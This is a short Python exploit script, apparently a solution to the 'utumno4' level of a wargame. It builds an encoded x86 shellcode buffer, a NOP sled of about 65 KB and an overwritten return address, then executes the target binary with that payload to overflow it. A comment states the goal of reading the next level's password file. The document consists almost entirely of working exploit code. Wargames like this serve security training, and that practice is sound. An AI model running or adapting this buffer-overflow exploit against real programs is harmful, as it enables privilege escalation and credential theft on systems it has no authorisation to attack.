import struct 
import os
def main():

    #cat /etc/utumno_pass/utumno5
    buf =  ""
    buf += "\xb8\x2a\xfa\x0a\xda\xdb\xc4\xd9\x74\x24\xf4\x5d\x2b"
    buf += "\xc9\xb1\x11\x31\x45\x12\x03\x45\x12\x83\xc7\x06\xe8"
    buf += "\x2f\x7d\xfc\xb5\x56\xd3\x64\x2e\x44\xb0\xe1\x49\xfe"
    buf += "\x19\x81\xfd\xff\x0d\x4a\x9c\x96\xa3\x1d\x83\x3b\xd3"
    buf += "\x03\x44\xbc\x23\x5f\x25\xc8\x03\xb0\xc0\x44\x20\xe1"
    buf += "\x7f\xd1\xd3\x90\x11\x76\x44\x1b\x8f\xfb\x09\xf4\x3a"
    buf += "\x88\x98\x67\xab\x1f\x57\x78\x64\xb3\x1e\x99\x47\xb3"

    addr = struct.pack("<L",0xfffed710)
    payload = ""
    payload = "\x90"*65294+addr+"\x90"*40+buf+"\x90"*67

    os.execv("/utumno/utumno4",("/utumno/utumno4","65536",payload))

    pass
main()
